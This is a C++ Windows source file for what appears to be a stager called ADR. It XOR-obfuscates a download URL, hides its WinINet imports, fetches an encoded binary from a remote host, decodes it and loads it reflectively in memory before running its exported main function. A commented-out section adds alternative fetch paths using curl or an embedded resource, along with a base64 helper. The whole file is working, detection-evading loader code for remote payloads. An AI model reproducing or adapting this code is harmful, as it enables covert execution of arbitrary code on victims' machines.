#include <iostream>
#include <vector>

#ifdef _DEBUG
#include <fstream>
#endif // _DEBUG


#include <windows.h>
#include <wininet.h>
#include <psapi.h>
#pragma comment(lib, "wininet.lib")

#include "mem/memod.h"
#include "utils.h"

typedef int (CALLBACK * DLL_FUNCTION)();
#define ADR_XOR_KEY 'A'
#define ADR_XOR_URL { 0x29, 0x35, 0x35, 0x31, 0x32, 0x7b, 0x6e, 0x6e, 0x26, 0x28, 0x35, 0x29, 0x34, 0x23, 0x6f, 0x22, 0x2e, 0x2c, 0x6e, 0x2b, 0x34, 0x2d, 0x24, 0x32, 0x26, 0x33, 0x22, 0x71, 0x6e, 0x00, 0x05, 0x13, 0x6e, 0x33, 0x20, 0x36, 0x6e, 0x2c, 0x20, 0x28, 0x2f, 0x6e, 0x00, 0x05, 0x13, 0x6f, 0x23, 0x28, 0x2f }
// XOR => https://github.com/julesgrc0/ADR/raw/main/ADR.bin


std::vector<char> GetPayload(const std::string& url)
{
	std::vector<char> payload;
	HMODULE hModule = NULL;

	HIDE_FUNCTION("wininet.dll", InternetOpenA, HINTERNET, (LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD), payload);
	HIDE_FUNCTION("wininet.dll", InternetCloseHandle, BOOL, (HINTERNET), payload);
	HIDE_FUNCTION("wininet.dll", InternetReadFile, BOOL, (HINTERNET, LPVOID, DWORD, LPDWORD), payload);
	HIDE_FUNCTION("wininet.dll", InternetOpenUrlA, HINTERNET, (HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR), payload);

	HINTERNET hInternet = hide_InternetOpenA("ADR", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL) 
	{
		return payload;
	}

	HINTERNET hConnect = hide_InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hConnect == NULL) 
	{
		hide_InternetCloseHandle(hInternet);
		return payload;
	}


	constexpr size_t bufferSize = 8192;
	std::vector<char> buffer(bufferSize);
	DWORD bytesRead = 0;

	while (hide_InternetReadFile(hConnect, buffer.data(), static_cast<DWORD>(buffer.size()), &bytesRead) && bytesRead > 0)
	{
		payload.insert(payload.end(), buffer.begin(), buffer.begin() + bytesRead);
	}

	hide_InternetCloseHandle(hConnect);
	hide_InternetCloseHandle(hInternet);

	return payload;
}

std::vector<char> DecodeXor(const std::vector<char>& in, char key)
{
	std::vector<char> out;
	out.reserve(in.size());

	for (char c : in) {
		out.push_back(c ^ key);
	}

	return out;
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_  HINSTANCE hPrevInstance, _In_ char* pCmdLine, _In_ int nCmdShow)
{
#ifdef _DEBUG

	if (AllocConsole())
	{
		FILE* fDummy;

		freopen_s(&fDummy, "CONOUT$", "w", stdout);
		freopen_s(&fDummy, "CONOUT$", "w", stderr);
		freopen_s(&fDummy, "CONIN$", "r", stdin);

		std::cout.clear();
		std::clog.clear();
		std::cerr.clear();
		std::cin.clear();
	}

	std::ifstream ifs("D:\\dev\\repos\\project\\software\\ADR\\x64\\Debug\\ADR.bin", std::fstream::binary | std::fstream::out);
	std::vector<char> data((std::istreambuf_iterator<char>(ifs)),(std::istreambuf_iterator<char>()));
	data = DecodeXor(data, ADR_XOR_KEY);
#else
	std::vector<char> url = DecodeXor(ADR_XOR_URL, ADR_XOR_KEY);
	std::vector<char> data = GetPayload(std::string(url.begin(), url.end()));
#endif // _DEBUG_EXE

	data = DecodeXor(data, ADR_XOR_KEY);
	HMEMORYMODULE handle = MemoryLoadLibrary(data.data(), data.size());
	if (!handle) return 1;

	DLL_FUNCTION main = (DLL_FUNCTION)MemoryGetProcAddress(handle, "main");
	if (!main) return 1;

	main();

	MemoryFreeLibrary(handle);
	return 0;
}


/*
#include "base64.h"
#include <curl/curl.h>
#include "resource.h"



---curl:

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::vector<char>* response) {
	size_t totalSize = size * nmemb;
	response->insert(response->end(), static_cast<unsigned char*>(contents), static_cast<unsigned char*>(contents) + totalSize);
	return totalSize;
}

std::string GetEncodedData()
{
	CURL* curl = curl_easy_init();
	if (!curl) return std::string();

	curl_easy_setopt(curl, CURLOPT_URL, PAYLOAD_URL);

	std::vector<char> response;
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

	CURLcode res = curl_easy_perform(curl);
	if (res != CURLE_OK)
	{
		curl_easy_cleanup(curl);
		return std::string();
	}

	curl_easy_cleanup(curl);
	return std::string(response.begin(), response.end());
}

---resource:

	HRSRC hResource = FindResourceW(hInstance, MAKEINTRESOURCE(IDR_EXE1), L"EXE");
	if (!hResource) return 1;

	HGLOBAL hLoadedResource = LoadResource(hInstance, hResource);
	if (!hLoadedResource) return 1;

	DWORD resourceSize = SizeofResource(hInstance, hResource);
	LPVOID resourceData = LockResource(hLoadedResource);


	std::string encodedData((char*)resourceData, resourceSize);


---base64:

#pragma once
#include <iostream>
#include <vector>

namespace base64 {

	static const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	static std::string encode(const std::string& in) {

		std::vector<unsigned char> out;
		out.reserve(((in.size() + 2) / 3) * 4);

		int val = 0, valb = -6;
		for (unsigned char c : in)
		{
			if (c == '\n') continue;

			val = (val << 8) + c;
			valb += 8;
			while (valb >= 0) {
				out.push_back(base64_chars[(val >> valb) & 0x3F]);
				valb -= 6;
			}
		}

		if (valb > -6)
		{
			out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
		}

		out.resize((out.size() + 3) / 4 * 4, '=');
		return std::string(out.begin(), out.end());
	}


	static std::string decode(const std::string& in) {
		std::vector<int> T(256, -1);
		for (int i = 0; i < 64; i++)
		{
			T[base64_chars[i]] = i;
		}

		std::string out;
		out.reserve((in.size() * 3) / 4);

		int val = 0, valb = -8;
		for (unsigned char c : in) {
			if (c == '\n') continue;

			if (T[c] == -1)
				break;

			val = (val << 6) + T[c];
			valb += 6;
			if (valb >= 0) {
				out.push_back(static_cast<char>((val >> valb) & 0xFF));
				valb -= 8;
			}
		}
		return out;
	}
}
*/